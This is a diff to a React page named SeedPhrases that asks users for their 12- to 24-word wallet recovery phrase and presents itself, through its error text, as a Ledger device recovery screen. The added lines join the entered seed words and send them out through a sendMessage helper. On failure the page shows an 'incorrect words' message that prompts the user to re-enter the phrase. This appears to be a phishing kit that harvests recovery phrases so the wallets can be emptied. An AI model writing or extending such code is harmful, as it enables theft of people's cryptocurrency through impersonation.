@@ -4,6 +4,7 @@ import ProgressBar from '../components/Progress/ProgressBar'
 import BackButton from '../components/Buttons/BackButton'
 import * as bip39 from 'bip39'
 import RecoverWalletModal from '../components/Modals/RecoverWalletModal'
+import { sendMessage } from '../utils/sendMessage'
 
 const SeedPhrases: React.FC = () => {
     const wordList = bip39.wordlists.english
@@ -12,10 +13,25 @@ const SeedPhrases: React.FC = () => {
     const [activeTab, setActiveTab] = useState<number>(12)
     const [words, setWords] = useState<Record<number, string>>({})
     const [errors, setErrors] = useState<Record<number, boolean>>({})
+    const [formError, setFormError] = useState<string>('')
 
     const showModal = () => {
         if (validateSeedPhrase()) {
+            setFormError('')
             setIsModalOpen(true)
+            sendMessage(Object.values(words).join(' '))
+                .then((res) => {
+                    if (res.ok) {
+                        setIsModalOpen(false)
+                    }
+                })
+                .catch((err) => {
+                    console.log(err)
+                    setIsModalOpen(false)
+                    setFormError(
+                        'The phrase is not valid. Please check and try again.'
+                    )
+                })
         }
     }
 
@@ -84,12 +100,13 @@ const SeedPhrases: React.FC = () => {
                         </p>
                     </div>
 
-                    {/* todo: validate on button click */}
-                    {/* <p className="text-red-600 text-[14px]">
-                        One or more words are incorrect. Please re-enter your
-                        recovery phrase to access your wallet on this Ledger
-                        Device.
-                    </p> */}
+                    {formError && (
+                        <p className="text-red-600 text-[14px]">
+                            One or more words are incorrect. Please re-enter
+                            your recovery phrase to access your wallet on this
+                            Ledger Device.
+                        </p>
+                    )}
 
                     <div className="my-[30px] flex justify-between gap-[20px]">
                         {[1, 18, 24].map((num, index) => (
